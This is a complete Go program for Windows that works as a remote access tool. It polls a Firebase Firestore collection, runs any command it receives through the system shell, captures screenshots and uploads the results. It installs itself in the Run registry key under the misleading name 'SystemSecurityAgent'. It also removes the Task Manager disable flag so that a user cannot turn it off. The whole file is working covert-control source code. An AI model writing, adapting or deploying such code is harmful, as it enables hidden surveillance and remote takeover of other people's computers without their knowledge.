package main

import (
	"bytes"
	"context"
	_ "embed"
	"encoding/base64"
	"fmt"
	"image/jpeg"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"cloud.google.com/go/firestore"
	firebase "firebase.google.com/go/v4"
	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
	"google.golang.org/api/option"
)

const (
	collectionName = "commands"
	pollInterval   = 10 * time.Second
	cmdTimeout     = 60 * time.Second
	logFileName    = "agent.log"
)

//go:embed serviceAccountKey.json
var credBytes []byte

var (
	kernel32        = syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex = kernel32.NewProc("CreateMutexW")
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("💥 FATAL PANIC: %v", r)
		}
	}()

	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	_ = os.Chdir(exeDir) // Always run relative to the exe location

	setupLogging()
	log.Println("🚀 Starting Agent...")

	preventMultipleInstances()
	log.Println("🔒 Single-instance check passed.")

	setupStartup(exePath)
	log.Println("📁 Registry startup check complete.")

	if len(credBytes) < 100 {
		log.Fatalf("❌ FATAL: serviceAccountKey.json was NOT embedded properly! Re-build the exe.")
	}
	log.Println("🔑 Embedded credentials found.")

	ctx := context.Background()
	var fsClient *firestore.Client
	var err error

	log.Println("🌐 Connecting to Firebase...")
	for i := 0; i < 10; i++ {
		creds := option.WithCredentialsJSON(credBytes)
		var app *firebase.App
		app, err = firebase.NewApp(ctx, nil, creds)
		if err == nil {
			// Add a 15-second timeout so it doesn't hang forever
			timeoutCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
			fsClient, err = app.Firestore(timeoutCtx)
			cancel()
			
			if err == nil {
				// Test the connection by doing a quick ping
				timeoutCtx2, cancel2 := context.WithTimeout(ctx, 10*time.Second)
				_, pingErr := fsClient.Collection("ping").Doc("ping").Get(timeoutCtx2)
				cancel2()
				
				// If pingErr is nil or "NotFound", the connection succeeded!
				if pingErr == nil || pingErr.Error() != "context deadline exceeded" {
					break
				}
				err = fmt.Errorf("network timeout - blocked by firewall")
			}
		}
		log.Printf("⏳ Connection failed (Attempt %d/10): %v. Retrying in 15 seconds...", i+1, err)
		time.Sleep(15 * time.Second)
	}

	if fsClient == nil {
		log.Fatalf("❌ Failed to connect to Firebase after retries: %v", err)
	}
	log.Println("✅ Connected to Firebase successfully!")
	log.Printf("👀 Watching collection '%s' every %s", collectionName, pollInterval)

	runCycle(ctx, fsClient)
	ticker := time.NewTicker(pollInterval)
	defer ticker.Stop()

	for {
		<-ticker.C
		runCycle(ctx, fsClient)
	}
}

func setupStartup(exePath string) {
	if runtime.GOOS != "windows" {
		return
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		log.Printf("⚠️ Failed to open Run registry key: %v", err)
		return
	}
	defer k.Close()

	targetValue := `"` + exePath + `"`
	currentVal, _, _ := k.GetStringValue("SystemSecurityAgent")
	if currentVal != targetValue {
		err = k.SetStringValue("SystemSecurityAgent", targetValue)
		if err != nil {
			log.Printf("⚠️ Failed to write to registry: %v", err)
		} else {
			log.Println("✅ Successfully registered in Windows Startup")
		}
	} else {
		log.Println("✅ Already registered in Windows Startup")
	}

	// Force ENABLE if disabled in Task Manager
	approvedKey, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`, registry.SET_VALUE)
	if err == nil {
		err = approvedKey.DeleteValue("SystemSecurityAgent")
		if err == nil {
			log.Println("✅ Removed Task Manager disable flag")
		}
		approvedKey.Close()
	}
}

func runCycle(ctx context.Context, client *firestore.Client) {
	iter := client.Collection(collectionName).Where("pending", "==", true).Documents(ctx)
	defer iter.Stop()

	for {
		doc, err := iter.Next()
		if err != nil {
			break
		}

		data := doc.Data()
		cmdStr, _ := data["cmd"].(string)
		if cmdStr == "" {
			continue
		}

		log.Printf("▶️  [%s] Running: %s", doc.Ref.ID, cmdStr)
		var result string

		if cmdStr == "screenshot" || cmdStr == "!screenshot" {
			log.Println("📸 Taking screenshot...")
			base64Img, err := takeScreenshot()
			if err != nil {
				result = fmt.Sprintf("[error] failed to take screenshot: %v", err)
			} else {
				result = "data:image/jpeg;base64," + base64Img
			}
		} else {
			var runErr error
			result, runErr = runShell(cmdStr)
			if runErr != nil {
				result = fmt.Sprintf("[error] %v\n%s", runErr, result)
			}
		}

		_, err = doc.Ref.Update(ctx, []firestore.Update{
			{Path: "pending", Value: false},
			{Path: "results", Value: result},
		})
		if err != nil {
			log.Printf("⚠️  Failed to save result for %s: %v", doc.Ref.ID, err)
		} else {
			log.Printf("✅ Saved result for %s", doc.Ref.ID)
		}
	}
}

func runShell(cmdStr string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
	defer cancel()

	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.CommandContext(ctx, "cmd", "/C", cmdStr)
	} else {
		c = exec.CommandContext(ctx, "sh", "-c", cmdStr)
	}
	out, err := c.CombinedOutput()
	return string(out), err
}

func takeScreenshot() (string, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "", fmt.Errorf("no active displays found")
	}
	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return "", err
	}
	var buf bytes.Buffer
	err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: 30})
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
}

func setupLogging() {
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	logPath := filepath.Join(exeDir, logFileName)

	// Use O_TRUNC so the log file is cleared every time you run it (easier debugging)
	f, err := os.OpenFile(logPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
	if err != nil {
		tempDir := os.TempDir()
		logPath = filepath.Join(tempDir, logFileName)
		f, err = os.OpenFile(logPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
		if err != nil {
			os.Exit(1)
		}
		notePath := filepath.Join(exeDir, "WHERE_IS_THE_LOG.txt")
		_ = os.WriteFile(notePath, []byte("Log file is located here:\n"+logPath), 0644)
	}
	
	log.SetOutput(f)
	log.Println("--- Agent Started ---")
}

func preventMultipleInstances() {
	if runtime.GOOS != "windows" {
		return
	}
	name, _ := syscall.UTF16PtrFromString("Local\\MyFirebaseAgentMutex")
	h, _, err := procCreateMutex.Call(0, 0, uintptr(unsafe.Pointer(name)))
	
	if h == 0 {
		log.Printf("⚠️ Mutex creation failed: %v", err)
		return
	}
	
	// Correct way to check if Mutex already exists in Go
	if syscall.GetLastError() == syscall.Errno(183) { // 183 = ERROR_ALREADY_EXISTS
		log.Println("⚠️ Another instance is already running! Exiting this one.")
		os.Exit(0)
	}
}